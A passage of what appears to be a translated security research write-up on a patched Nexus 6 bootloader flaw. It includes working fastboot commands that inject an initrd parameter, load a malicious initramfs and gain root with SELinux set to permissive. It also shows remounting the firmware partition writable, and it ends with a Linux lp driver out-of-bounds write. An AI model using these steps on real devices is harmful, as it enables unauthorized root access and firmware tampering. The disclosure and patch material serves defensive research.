### 代码片段优化

```c
void some_function() {
    int v8 = return11000000();
    int v9 = return20000000();
    fastboot_init(v8, v9);
    int v11 = sub_FF2EA94(v10);
    if (v13 != v10021C84) {
        sub_FF3D784();
    }
    return sub_FF15BA4(v11);
}

int return11000000() {
    int result = 0x11000000;
    if (v10021C84 != v10021C84) {
        sub_FF3D784();
    }
    return result;
}
```

该值最终被ABOOT的下载处理程序所使用。

### 内存布局说明

在initramfs存档填充到rootfs之前，物理内存的布局如下所示：

现在我们可以将自己的initramfs放到某个固定的物理地址上，并指导内核填充它。

### 创建恶意的initramfs

最后一个步骤是创建恶意的initramfs。可以通过编译一个userdebug AOSP启动镜像并删除其中的`initramfs.cpio.gz`文件来实现。这个文件通常包含su域和一个root可用的adbd。唯一会发出警告的是dm-verity，因为它无法验证官方的system分区（因为AOSP启动镜像包含调试版的verity_key）。无论如何，既然我们现在可以加载一个恶意的initramfs，我们就可以修改fstab文件（删除验证过程）或替换调试版的verity_key为相应的官方发行版。

读者可以从我们的[GitHub仓库](https://github.com/alephsecurity/research/tree/master/initroot)中找到用于PoC演示的initramfs。

### 获取root权限

现在一切条件已经准备就绪：
1. 我们有了一个恶意的initramfs存档。
2. 我们可以使用fastboot接口从固定的物理地址将initramfs载入内存。
3. 我们可以引导Linux内核填充这个initramfs。

对于安全启动流程来说，信任关系已被破坏，如下所示：

成功的攻击过程如下所示：

```sh
$ adb shell
shamu:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0
shamu:/ $ getenforce
Enforcing
shamu:/ $ setenforce permissive
setenforce: Couldn't set enforcing status to 'permissive': Permission denied
shamu:/ $ reboot bootloader
$ fastboot getvar unlocked
...
unlocked: no
finished. total time: 0.008s
$ fastboot oem config fsg-id "a initrd=0x11000000,1518172"
...
FSG IDs, see http://goo.gl/gPmhU
OKAY [  0.016s]
finished. total time: 0.016s
$ fastboot flash aleph malicious.cpio.gz
...
target reported max download size of 536870912 bytes
sending 'aleph' (1482 KB)...
OKAY [  0.050s]
writing 'aleph'...
(bootloader) Not allowed in LOCKED state!
FAILED (remote failure)
finished. total time: 0.054s
$ fastboot continue
...
resuming boot...
OKAY [  0.007s]
finished. total time: 0.007s
$ adb shell
shamu:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
shamu:/ # getenforce
Enforcing
shamu:/ # setenforce permissive
shamu:/ # getenforce
Permissive
shamu:/ #
```

### 超越initramfs：固件注入

现在我们已经完全控制了rootfs，可以创建一个恶意的/vendor目录，该目录通常包含当前设备可用的各种SoC固件镜像：

```sh
shamu:/ # ls /vendor/firmware
VRGain.bin adsp.b03 adsp.b11 bcm20795_firmware.ncd left.boost.music.eq left.boost_n1b12.patch right.boost.ringtone.eq right.boost_ringtone_table.preset venus.mdt
...
shamu:/ # umount -f /firmware
shamu:/ # mount /dev/block/mmcblk0p1 /firmware -o rw
shamu:/ # ls /firmware/image
acdb.mbn bdwlan20.bin cmnlib.b03 efs1.bin isdbtmm.b01 mba_9225.mbn.gz playready.b00 playready.mdt prov.b03 qwlan11.bin sampleapp.b00 sampleapp.mdt securemm.b01 tqs.b00 tqs.mdt utf20.bin
...
shamu:/ # echo foo > /firmware/image/foo
shamu:/ # cat /firmware/image/foo
foo
```

内核驱动通常会在初始化时使用这些镜像，并在需要时更新它们的SoC副本。因此，攻击者可以写入未签名的固件镜像。我们没有确认这种攻击场景是否有效，但根据我们对其他设备的经验，这种场景应该是可行的。对于签名的固件来说，攻击者可以利用这种方式实现降级攻击。此外，调制解调器固件位于/firmware/image目录下，理论上讲，我们可以通过修改这个目录完成类似攻击。同样，我们也没有去验证设备是否存在某种完整性检查机制以及设备是否会受到降级攻击，我们可以在未来工作中研究这个问题。

### Google的补丁

Google在2017年5月的安全公告中发布了这个漏洞的补丁。N6F27C版系统中Bootloader版本已升级至moto-apq8084-72.03，这版Bootloader会对fsg-id、carrier以及console的配置参数进行过滤处理：

```sh
$ fastboot oem config fsg-id "foo foo=1"
...
$ fastboot oem config carrier "bar bar=1"
...
$ fastboot oem config carrier "baz baz=1"
...
$ fastboot oem config
...
(bootloader) 
(bootloader)   
(bootloader)     bar
(bootloader)   
(bootloader)   
(bootloader)     Carrier IDs, see http://goo.gl/lojLh3
(bootloader)   
(bootloader) 
(bootloader) 
(bootloader)   
(bootloader)     baz
(bootloader)   
(bootloader)   
(bootloader)     Config kernel console log
(bootloader)       enable|true     - enable with default settings
(bootloader)       disable|false   - disable
(bootloader)        - enable with customized settings
(bootloader)       (e.g.: "ttyHSL0", "ttyHSL0,230400,n8")
(bootloader)   
(bootloader) 
(bootloader) 
(bootloader)   
(bootloader)     foo
(bootloader)   
(bootloader)   
(bootloader)     FSG IDs, see http://goo.gl/gPmhU
(bootloader)   
(bootloader) ]
```

### 题外话：Linux内核越界写入漏洞（CVE-2017-1000363）

在本次研究过程中，我们意外发现了另一个漏洞（[CVE-2017-1000363](https://alephsecurity.com/vulns/aleph-2017023)），这是Linux内核中的一个越界写入漏洞，历史非常久远（从2.2.0版本起就已经存在！）。漏洞位于lp驱动中（因此内核参数需为CONFIG_PRINTER=y），当许多lp=none参数被附加到内核命令行中时该漏洞就会被触发：

```c
static int parport_nr[LP_NO] = { [0 ... LP_NO-1] = LP_PARPORT_UNSPEC };
...
#ifndef MODULE
static int __init lp_setup (char *str) {
    static int parport_ptr;
    ...
    } else if (!strcmp(str, "none")) {
        parport_nr[parport_ptr++] = LP_PARPORT_NONE;
    } 
    ...
}
#endif
...
__setup("lp=", lp_setup);
```

相应的[补丁](https://alephsecurity.com/vulns/aleph-2017023)已经提交到主线内核上。